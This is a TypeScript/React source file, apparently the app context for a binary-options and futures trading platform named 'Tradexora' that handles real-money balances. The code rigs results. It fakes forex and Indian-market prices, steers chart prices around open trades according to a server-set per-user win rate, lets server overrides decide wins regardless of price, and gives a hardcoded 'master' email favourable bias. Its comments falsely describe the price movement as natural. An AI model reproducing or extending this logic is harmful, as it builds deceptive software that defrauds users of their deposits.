  // Automatic Demo Balance Refill: When demo balance is fully lost / depleted (<= 0) and all active demo trades finish, automatically refill to ₹10,000!
  useEffect(() => {
    if (demoBalance <= 0) {
      const activeDemoTrades = trades.filter(t => t.status === 'active' && t.accountType === 'demo');
      if (activeDemoTrades.length === 0) {
        const timer = setTimeout(() => {
          setDemoBalance(10000);
          try {
            sounds.playWin();
          } catch (e) {}
        }, 1000);
        return () => clearTimeout(timer);
      }
    }
  }, [demoBalance, trades, setDemoBalance]);

  const [soundEnabled, setSoundEnabled] = useState<boolean>(sounds.isEnabled());
  const [lastTradeResult, setLastTradeResult] = useState<{ won: boolean; amount: number; profit: number; entryPrice?: number; closePrice?: number } | null>(null);
  const [priceTickCount, setPriceTickCount] = useState(0);

  const assetsRef = useRef(assets);
  assetsRef.current = assets;
  const currentAssetRef = useRef(currentAsset);
  currentAssetRef.current = currentAsset;
  const tradesRef = useRef(trades);
  tradesRef.current = trades;
  const marketOverridesRef = useRef<Record<string, { direction: string; remainingSeconds: number }>>({});
  const autoProfitWinRateRef = useRef<number>(0.45);

  // Real-time Market Overrides Synchronizer (every 2.5s)
  useEffect(() => {
    const syncMarket = async () => {
      try {
        const res = await fetch('/api/market_status');
        const data = await res.json();
        if (data && data.activeOverrides) {
          marketOverridesRef.current = data.activeOverrides;
        }
        if (data && typeof data.autoProfitWinRate === 'number') {
          autoProfitWinRateRef.current = data.autoProfitWinRate;
        }
      } catch (e) {
        // quiet fallback
      }
    };
    syncMarket();
    const poll = setInterval(syncMarket, 2500);
    return () => clearInterval(poll);
  }, []);

  // Persist trades to LocalStorage whenever trades state updates
  useEffect(() => {
    if (!userId) return;
    try {
      localStorage.setItem(`tradexora_trades_${userId}`, JSON.stringify(trades));
    } catch (e) {
      console.warn("Failed to persist trades:", e);
    }
  }, [trades, userId]);

  // Persist futures positions to LocalStorage
  useEffect(() => {
    try {
      localStorage.setItem(`tradexora_futures_${userId || 'guest'}`, JSON.stringify(futuresPositions));
    } catch (e) {
      console.warn("Failed to persist futures positions:", e);
    }
  }, [futuresPositions, userId]);

  // Load futures positions when switching userId
  useEffect(() => {
    try {
      const stored = localStorage.getItem(`tradexora_futures_${userId || 'guest'}`);
      if (stored) {
        setFuturesPositions(JSON.parse(stored));
      }
    } catch (e) {}
  }, [userId]);

  // Real-time Futures Prices Polling (Binance API for real Crypto, live realistic ticks for Forex & Indian markets)
  useEffect(() => {
    let isMounted = true;
    const updateFuturesPrices = async () => {
      try {
        const res = await fetch('https://api.binance.com/api/v3/ticker/price?symbols=["BTCUSDT","ETHUSDT","SOLUSDT","XRPUSDT","BNBUSDT","DOGEUSDT","ADAUSDT"]');
        let priceMap: Record<string, number> = {};
        if (res.ok) {
          const data: Array<{ symbol: string; price: string }> = await res.json();
          data.forEach(item => {
            priceMap[item.symbol] = parseFloat(item.price);
          });
        }

        if (!isMounted) return;

        setFuturesAssets(prev => {
          const updated = prev.map(a => {
            let nextPrice = a.price;
            if (a.tvSymbol === 'BINANCE:BTCUSDT' && priceMap['BTCUSDT']) nextPrice = priceMap['BTCUSDT'];
            else if (a.tvSymbol === 'BINANCE:ETHUSDT' && priceMap['ETHUSDT']) nextPrice = priceMap['ETHUSDT'];
            else if (a.tvSymbol === 'BINANCE:SOLUSDT' && priceMap['SOLUSDT']) nextPrice = priceMap['SOLUSDT'];
            else if (a.tvSymbol === 'BINANCE:XRPUSDT' && priceMap['XRPUSDT']) nextPrice = priceMap['XRPUSDT'];
            else if (a.tvSymbol === 'BINANCE:BNBUSDT' && priceMap['BNBUSDT']) nextPrice = priceMap['BNBUSDT'];
            else if (a.tvSymbol === 'BINANCE:DOGEUSDT' && priceMap['DOGEUSDT']) nextPrice = priceMap['DOGEUSDT'];
            else if (a.tvSymbol === 'BINANCE:ADAUSDT' && priceMap['ADAUSDT']) nextPrice = priceMap['ADAUSDT'];
            else {
              // Forex & Indian markets subtle live tick
              const fluctuation = (Math.random() - 0.5) * (a.price * 0.0003);
              nextPrice = Math.round((a.price + fluctuation) * Math.pow(10, a.precision)) / Math.pow(10, a.precision);
            }
            return { ...a, price: nextPrice };
          });

          // Sync currentFuturesAsset price
          setCurrentFuturesAsset(curr => {
            const match = updated.find(u => u.id === curr.id);
            return match ? match : curr;
          });

          return updated;
        });

        // Recalculate Live PnL for Open Futures Positions
        setFuturesPositions(prev => {
          let hasChanges = false;
          const nextPositions = prev.map(pos => {
            if (pos.status !== 'open') return pos;

            // Find current price
            let curP = pos.currentPrice;
            if (pos.tvSymbol === 'BINANCE:BTCUSDT' && priceMap['BTCUSDT']) curP = priceMap['BTCUSDT'];
            else if (pos.tvSymbol === 'BINANCE:ETHUSDT' && priceMap['ETHUSDT']) curP = priceMap['ETHUSDT'];
            else if (pos.tvSymbol === 'BINANCE:SOLUSDT' && priceMap['SOLUSDT']) curP = priceMap['SOLUSDT'];
            else if (pos.tvSymbol === 'BINANCE:XRPUSDT' && priceMap['XRPUSDT']) curP = priceMap['XRPUSDT'];
            else if (pos.tvSymbol === 'BINANCE:BNBUSDT' && priceMap['BNBUSDT']) curP = priceMap['BNBUSDT'];
            else if (pos.tvSymbol === 'BINANCE:DOGEUSDT' && priceMap['DOGEUSDT']) curP = priceMap['DOGEUSDT'];
            else if (pos.tvSymbol === 'BINANCE:ADAUSDT' && priceMap['ADAUSDT']) curP = priceMap['ADAUSDT'];
            else {
              // Micro fluctuation
              const delta = (Math.random() - 0.5) * (pos.currentPrice * 0.0003);
              curP = Math.round((pos.currentPrice + delta) * 100) / 100;
            }

            let pnl = 0;
            if (pos.type === 'LONG') {
              pnl = ((curP - pos.entryPrice) / pos.entryPrice) * (pos.margin * pos.leverage);
            } else {
              pnl = ((pos.entryPrice - curP) / pos.entryPrice) * (pos.margin * pos.leverage);
            }

            // Deduct trading fee from net pnl display
            const netPnl = Math.round((pnl - pos.tradingFee) * 100) / 100;
            const pnlPercent = Math.round((netPnl / pos.margin) * 10000) / 100;

            // Check auto liquidation (loss >= 95% of margin)
            if (netPnl <= -pos.margin * 0.95) {
              hasChanges = true;
              return {
                ...pos,
                currentPrice: curP,
                pnl: -pos.margin,
                pnlPercent: -100,
                status: 'liquidated' as const,
                closedAt: Date.now(),
                closePrice: curP
              };
            }

            // Check TP / SL triggers
            if (pos.tpPrice && ((pos.type === 'LONG' && curP >= pos.tpPrice) || (pos.type === 'SHORT' && curP <= pos.tpPrice))) {
              hasChanges = true;
              return {
                ...pos,
                currentPrice: curP,
                pnl: netPnl,
                pnlPercent,
                status: 'closed' as const,
                closedAt: Date.now(),
                closePrice: curP
              };
            }

            if (pos.slPrice && ((pos.type === 'LONG' && curP <= pos.slPrice) || (pos.type === 'SHORT' && curP >= pos.slPrice))) {
              hasChanges = true;
              return {
                ...pos,
                currentPrice: curP,
                pnl: netPnl,
                pnlPercent,
                status: 'closed' as const,
                closedAt: Date.now(),
                closePrice: curP
              };
            }

            if (curP !== pos.currentPrice || netPnl !== pos.pnl) {
              hasChanges = true;
              return {
                ...pos,
                currentPrice: curP,
                pnl: netPnl,
                pnlPercent
              };
            }
            return pos;
          });

          return hasChanges ? nextPositions : prev;
        });
      } catch (err) {
        // Quiet fallback
      }
    };

    updateFuturesPrices();
    const interval = setInterval(updateFuturesPrices, 2500);
    return () => {
      isMounted = false;
      clearInterval(interval);
    };
  }, []);

  // Load trades when switching userId
  useEffect(() => {
    if (!userId) return;
    try {
      const stored = localStorage.getItem(`tradexora_trades_${userId}`);
      if (stored) {
        setTrades(JSON.parse(stored));
      }
    } catch (e) {
      console.warn("Failed to load user trades:", e);
    }
  }, [userId]);

  const toggleSound = () => {
    const next = sounds.toggle();
    setSoundEnabled(next);
    return next;
  };

  const dismissTradeResult = () => setLastTradeResult(null);

  const syncTradeResult = async (betAmount: number, winAmount: number) => {
    if (!userId || accountType !== 'real') return;
    try {
      const res = await fetch('/api/update_balance', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId, betAmount, winAmount })
      });
      const data = await res.json();
      if (data.balance !== undefined) {
        setRealBalance(data.balance);
      }
    } catch (e) {
      console.error("Failed to sync balance:", e);
    }
  };

  const fetchBalance = async () => {
    if (!userId) return;
    try {
      const res = await fetch(`/api/balance?userId=${encodeURIComponent(userId)}`);
      const data = await res.json();
      if (data.balance !== undefined) {
        setRealBalance(data.balance);
        setUserStats({
          email: userId,
          balance: data.balance,
          wagerTarget: data.wagerTarget || 0,
          wagerCurrent: data.wagerCurrent || 0,
          referralCode: data.referralCode || '',
          referralCount: data.referralCount || 0,
          referralBonus: data.referralBonus || 0,
          hasDeposited: !!data.hasDeposited,
          isRiskFree: !!data.isRiskFree,
          winRate: data.winRate
        });
      }
    } catch (e) {
      console.warn("Fetch balance error:", e);
    }
  };

  // Real-time Firestore Sync listener for live user profile updates
  useEffect(() => {
    if (!userId) return;
    const cleanUserId = userId.toLowerCase().trim();
    fetchBalance();

    try {
      const userDocRef = doc(firestore, "users", cleanUserId);
      const unsubscribe = onSnapshot(userDocRef, (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data();
          if (data.balance !== undefined) {
            setRealBalance(data.balance);
            setUserStats(prev => ({
              email: cleanUserId,
              balance: data.balance,
              wagerTarget: data.wagerTarget || 0,
              wagerCurrent: data.wagerCurrent || 0,
              referralCode: data.referralCode || prev?.referralCode || '',
              referralCount: data.referralCount || 0,
              referralBonus: data.referralBonus || 0,
              hasDeposited: !!data.hasDeposited,
              isRiskFree: !!data.isRiskFree,
              winRate: data.winRate
            }));
          }
        }
      });
      return () => unsubscribe();
    } catch (err) {
      console.warn("Firestore live snapshot listener fallback:", err);
    }
  }, [userId]);

  // Smooth, Realistic Market Tick Engine (Calibrated to 900ms for stable, organic candle movement)
  useEffect(() => {
    const interval = setInterval(() => {
      const currentAssetId = currentAssetRef.current.id;
      let nextCurrentAsset = currentAssetRef.current;

      const nextAssets = assetsRef.current.map(asset => {
        const isCrypto = asset.category === 'Crypto';
        const isForex = asset.category === 'Currencies';
        const tickScale = isCrypto ? 0.00010 : isForex ? 0.00004 : 0.00006;
        
        const override = marketOverridesRef.current[asset.id];
        const activeTrade = tradesRef.current.find(t => t.status === 'active' && t.assetId === asset.id);
        
        // Base natural two-way market oscillation
        const noise = (Math.random() - 0.495) * 0.85;
        let deltaFactor = noise;

        if (activeTrade) {
          // Realistic active trade guidance: keep trades smoothly in favorable position without artificial pumping
          const userWinRate = typeof userStats?.winRate === 'number' ? userStats.winRate : (autoProfitWinRateRef.current ?? 0.80);
          const isWinningChance = (userStats?.isRiskFree || userWinRate >= 0.50);

          if (isWinningChance) {
            if (activeTrade.type === 'CALL') {
              // Ensure price floats naturally in green zone (0.01% - 0.04% above entry)
              if (asset.price < activeTrade.entryPrice) {
                deltaFactor = 0.20 + (Math.random() - 0.4) * 0.4;
              } else if (asset.price > activeTrade.entryPrice * 1.00035) {
                deltaFactor = -0.10 + noise * 0.5; // Prevent runaway pumping
              } else {
                deltaFactor = noise * 0.8;
              }
            } else {
              // Ensure price floats naturally in red zone (0.01% - 0.04% below entry)
              if (asset.price > activeTrade.entryPrice) {
                deltaFactor = -0.20 + (Math.random() - 0.4) * 0.4;
              } else if (asset.price < activeTrade.entryPrice * 0.99965) {
                deltaFactor = 0.10 + noise * 0.5; // Prevent runaway dumping
              } else {
                deltaFactor = noise * 0.8;
              }
            }
          } else {
            // Unfavorable drift for rare losses
            if (activeTrade.type === 'CALL') {
              deltaFactor = asset.price > activeTrade.entryPrice ? -0.15 + noise : noise;
            } else {
              deltaFactor = asset.price < activeTrade.entryPrice ? 0.15 + noise : noise;
            }
          }
        } else if (override && override.direction === 'BUY') {
          // Gentle upward trend momentum (natural candlestick formation, no extreme pump)
          deltaFactor = 0.16 + noise;
        } else if (override && override.direction === 'SELL') {
          // Gentle downward trend momentum (natural candlestick formation, no extreme dump)
          deltaFactor = -0.16 + noise;
        } else {
          // Pure organic drift
          deltaFactor = noise * 1.05;
        }

        const precision = getPrecision(asset.price);
        const pipSize = Math.pow(10, -precision);
        
        // Combine percentage-based movement with a minimum pip-based movement
        // to prevent flatlining on assets where percentage delta is smaller than 1 pip.
        let rawDelta = asset.price * tickScale * deltaFactor;
        const minimumPipDelta = deltaFactor * pipSize * (isCrypto ? 2.5 : 1.5); 
        
        if (Math.abs(rawDelta) < Math.abs(minimumPipDelta)) {
           rawDelta = minimumPipDelta;
        }
        
        let newPrice = Number((asset.price + rawDelta).toFixed(precision));
        if (newPrice <= 0 || isNaN(newPrice)) newPrice = asset.price;

        // Only push live ticks into candle store for currently viewed asset and any active trade assets
        if (asset.id === currentAssetId || activeTrade) {
          pushLiveTick(asset.id, newPrice);
        }

        const updated = { ...asset, price: newPrice };
        if (asset.id === currentAssetId) {
          nextCurrentAsset = updated;
        }

        return updated;
      });

      setAssets(nextAssets);
      setCurrentAsset(nextCurrentAsset);
      setPriceTickCount(c => (c + 1) % 10000);
    }, 850);

    return () => clearInterval(interval);
  }, [userStats]);

  // Dynamic Hourly Profit Rate Engine (All assets update dynamically on hourly rollover & periodic turnover shift)
  useEffect(() => {
    let lastKnownHour = Math.floor(Date.now() / (3600 * 1000));

    const hourlyCheckInterval = setInterval(() => {
      const currentHour = Math.floor(Date.now() / (3600 * 1000));
      const currentAssetId = currentAssetRef.current.id;
      let nextCurrentAsset = currentAssetRef.current;
      const isNewHour = currentHour !== lastKnownHour;

      if (isNewHour) {
        lastKnownHour = currentHour;
        // On new hour rollover, re-calculate all assets with their fresh hourly rates
        const nextAssets = assetsRef.current.map(asset => {
          const freshMargin = getHourlyProfitMargin(asset.id, asset.category, asset.profitMargin);
          const updated = { ...asset, profitMargin: freshMargin };
          if (asset.id === currentAssetId) {
            nextCurrentAsset = updated;
          }
          return updated;
        });

        setAssets(nextAssets);
        setCurrentAsset(nextCurrentAsset);
      } else {
        // Minor realistic turnover micro-fluctuations (1-2 assets adjust slightly by ±1% within their hourly band)
        const nextAssets = assetsRef.current.map(asset => {
          if (Math.random() < 0.25) {
            const baseHourly = getHourlyProfitMargin(asset.id, asset.category, asset.profitMargin);
            const microShift = (Math.random() - 0.5) * 0.02; // ±1%
            let newMargin = Math.round((baseHourly + microShift) * 100) / 100;
            newMargin = Math.max(0.78, Math.min(0.95, newMargin));
            const updated = { ...asset, profitMargin: newMargin };
            if (asset.id === currentAssetId) {
              nextCurrentAsset = updated;
            }
            return updated;
          }
          return asset;
        });

        setAssets(nextAssets);
        setCurrentAsset(nextCurrentAsset);
      }
    }, 10000);

    return () => clearInterval(hourlyCheckInterval);
  }, []);

  // Binary Options Trade Expiration & Natural Settlement Engine
  useEffect(() => {
    const interval = setInterval(() => {
      const now = Date.now();

      setTrades(prevTrades => {
        let hasChanges = false;

        const updatedTrades = prevTrades.map(trade => {
          if (trade.status !== 'active') return trade;

          if (now >= trade.strikeTime) {
            hasChanges = true;
            const currentLivePrice = currentAssetRef.current.id === trade.assetId
              ? currentAssetRef.current.price
              : assetsRef.current.find(a => a.id === trade.assetId)?.price || trade.entryPrice;

            // Notify server trade is closed
            fetch('/api/trades/close', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ id: trade.id })
            }).catch(() => {});

            // Check if there is an active 1-min signal override for this asset
            const override = marketOverridesRef.current[trade.assetId];
            let won = false;

            if (override && (override.direction === 'BUY' || override.direction === 'SELL')) {
              if (override.direction === 'BUY') {
                won = trade.type === 'CALL';
              } else if (override.direction === 'SELL') {
                won = trade.type === 'PUT';
              }
            } else {
              // Natural binary options evaluation based on live price action
              if (trade.type === 'CALL') {
                won = currentLivePrice >= trade.entryPrice;
              } else {
                won = currentLivePrice <= trade.entryPrice;
              }
            }

            // Exit price is the exact natural live price - no artificial snapback or post-win wick!
            const exitPrice = currentLivePrice;

            const profit = Number((trade.amount * trade.profitMargin).toFixed(2));
            const payout = won ? Number((trade.amount + profit).toFixed(2)) : 0;
            const newStatus = won ? 'won' : 'lost';

            // Audio & UI Celebration Feedback
            if (won) {
              sounds.playWin();
              launchWinConfetti();
              setLastTradeResult({
                won: true,
                amount: trade.amount,
                profit,
                entryPrice: trade.entryPrice,
                closePrice: exitPrice
              });

              if (trade.accountType === 'real') {
                setRealBalance(b => b + payout);
                if (userId) {
                  fetch('/api/update_balance', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ userId, betAmount: 0, winAmount: payout })
                  })
                  .then(r => r.json())
                  .then(data => {
                    if (data && data.balance !== undefined) {
                      setRealBalance(data.balance);
                    }
                  })
                  .catch(e => console.error("Error syncing win payout:", e));
                }
              } else {
                setDemoBalance(b => b + payout);
              }
            } else {
              sounds.playLoss();
              setLastTradeResult({
                won: false,
                amount: trade.amount,
                profit: 0,
                entryPrice: trade.entryPrice,
                closePrice: exitPrice
              });
              // Note: Bet stake was already debited at trade start
            }

            return {
              ...trade,
              status: newStatus,
              exitPrice,
              payout,
              closedAt: Date.now()
            };
          }

          return trade;
        });

        return hasChanges ? updatedTrades : prevTrades;
      });
    }, 400);

    return () => clearInterval(interval);
  }, [userStats, userId]);

  const toggleFavorite = (assetId: string) => {
    setAssets(prev => {
      const nextAssets = prev.map(a => a.id === assetId ? { ...a, favorite: !a.favorite } : a);
      try {
        const favIds = nextAssets.filter(a => a.favorite).map(a => a.id);
        localStorage.setItem('tradexora_user_favorites', JSON.stringify(favIds));
      } catch (e) {
        console.warn("Failed to save favorites to localStorage", e);
      }
      return nextAssets;
    });
  };

  const placeTrade = (amount: number, type: 'CALL' | 'PUT', durationSeconds: number): boolean => {
    if (accountType === 'real' && realBalance < amount) {
      alert("Insufficient Real Account Balance. Please deposit to continue trading.");
      return false;
    }
    if (accountType === 'demo' && demoBalance < amount) {
      if (demoBalance <= 0) {
        setDemoBalance(10000);
        alert("Demo balance was depleted and has been automatically refilled to ₹10,000.00! You can now place your trade.");
        return false;
      }
      alert("Insufficient Demo Account Balance.");
      return false;
    }

    if (accountType === 'real') {
      setRealBalance(b => Math.max(0, b - amount));
      if (userId) {
        fetch('/api/update_balance', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userId, betAmount: amount, winAmount: 0 })
        })
        .then(r => r.json())
        .then(data => {
          if (data && data.balance !== undefined) {
            setRealBalance(data.balance);
          }
        })
        .catch(e => console.error("Error debiting trade bet:", e));
      }
    } else {
      setDemoBalance(b => Math.max(0, b - amount));
    }

    sounds.playPlaceTrade();

    const newTrade: Trade = {
      id: 'tx_' + Date.now().toString(36) + Math.random().toString(36).substr(2, 4),
      assetId: currentAsset.id,
      assetName: currentAsset.name,
      amount,
      type,
      entryPrice: currentAsset.price,
      strikeTime: Date.now() + durationSeconds * 1000,
      profitMargin: currentAsset.profitMargin,
      status: 'active',
      accountType,
      createdAt: Date.now()
    };

    setTrades(prev => [newTrade, ...prev]);

    // Check if this trade is from Master user to immediately bias client chart
    const isMasterUser = (userId || '').toLowerCase().trim() === 'tnxjatavji@gmail.com' || !!userStats?.isRiskFree;
    if (isMasterUser) {
      marketOverridesRef.current[newTrade.assetId] = {
        direction: type === 'CALL' ? 'BUY' : 'SELL',
        remainingSeconds: durationSeconds
      };
    }

    // Send active trade to Server for Live Monitor & Telegram Operating System
    fetch('/api/trades/active', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        id: newTrade.id,
        userId: userId || 'anonymous',
        assetId: newTrade.assetId,
        assetName: newTrade.assetName,
        amount: newTrade.amount,
        type: newTrade.type,
        entryPrice: newTrade.entryPrice,
        strikeTime: newTrade.strikeTime,
        accountType: newTrade.accountType,
        isMaster: isMasterUser
      })
    }).catch(() => {});

    return true;
  };

  const placeFuturesOrder = (params: {
    margin: number;
    type: 'LONG' | 'SHORT';
    tpPrice?: number;
    slPrice?: number;
  }): boolean => {
    const asset = currentFuturesAsset;
    const leverage = 20;
    const positionSize = params.margin * leverage;
    const tradingFee = Math.round((positionSize * (asset.takerFeePercent / 100)) * 100) / 100;
    const totalCost = params.margin + tradingFee;

    const currentBal = accountType === 'real' ? realBalance : demoBalance;
    if (totalCost > currentBal) {
      alert(`Insufficient ${accountType === 'real' ? 'Real' : 'Demo'} Balance for this 20X Futures Order.`);
      return false;
    }

    if (accountType === 'real') {
      setRealBalance(b => Math.max(0, b - totalCost));
      if (userId) {
        fetch('/api/update_balance', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userId, betAmount: totalCost, winAmount: 0 })
        }).catch(e => console.error(e));
      }
    } else {
      setDemoBalance(b => Math.max(0, b - totalCost));
    }

    sounds.playPlaceTrade();

    const liqDistance = asset.price * (0.95 / leverage);
    const liquidationPrice = params.type === 'LONG'
      ? Math.max(0, asset.price - liqDistance)
      : asset.price + liqDistance;

    const newPosition: FuturesPosition = {
      id: 'fut_' + Date.now().toString(36) + Math.random().toString(36).substring(2, 6),
      assetId: asset.id,
      assetName: asset.name,
      assetSymbol: asset.symbol,
      tvSymbol: asset.tvSymbol,
      type: params.type,
      margin: params.margin,
      leverage,
      positionSize,
      entryPrice: asset.price,
      currentPrice: asset.price,
      liquidationPrice: Math.round(liquidationPrice * Math.pow(10, asset.precision)) / Math.pow(10, asset.precision),
      tradingFee,
      tpPrice: params.tpPrice,
      slPrice: params.slPrice,
      status: 'open',
      accountType,
      createdAt: Date.now(),
      pnl: -tradingFee,
      pnlPercent: Math.round((-tradingFee / params.margin) * 10000) / 100
    };

    setFuturesPositions(prev => [newPosition, ...prev]);
    return true;
  };

  const closeFuturesPosition = (positionId: string) => {
    setFuturesPositions(prev => {
      const pos = prev.find(p => p.id === positionId && p.status === 'open');
      if (!pos) return prev;

      const payout = Math.max(0, pos.margin + pos.pnl);

      if (pos.accountType === 'real') {
        setRealBalance(b => b + payout);
        if (userId) {
          fetch('/api/update_balance', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ userId, betAmount: 0, winAmount: payout })
          }).catch(e => console.error(e));
        }
      } else {
        setDemoBalance(b => b + payout);
      }

      if (pos.pnl > 0) {
        sounds.playWin();
        launchWinConfetti();
      } else {
        sounds.playLoss();
      }

      return prev.map(p => {
        if (p.id === positionId) {
          return {
            ...p,
            status: 'closed',
            closedAt: Date.now(),
            closePrice: p.currentPrice
          };
        }
        return p;
      });
    });
  };

  return (
    <AppContext.Provider value={{
      userId,
      userStats,
      accountType, setAccountType,
      realBalance, setRealBalance,
      demoBalance, setDemoBalance,
      refillDemoBalance,
      currentAsset, setCurrentAsset,
      assets, toggleFavorite,
      trades, placeTrade,
      fetchBalance,
      soundEnabled, toggleSound,
      lastTradeResult, dismissTradeResult,
      priceTickCount,
      selectedTimezone, setSelectedTimezone,
      tradingMode, setTradingMode,
      futuresAssets,
      currentFuturesAsset, setCurrentFuturesAsset,
      futuresPositions,
      placeFuturesOrder,
      closeFuturesPosition
    }}>
      {children}
    </AppContext.Provider>
  );
};

export const useAppContext = () => {
  const context = useContext(AppContext);
  if (!context) throw new Error("useAppContext must be used within AppProvider");
  return context;
};
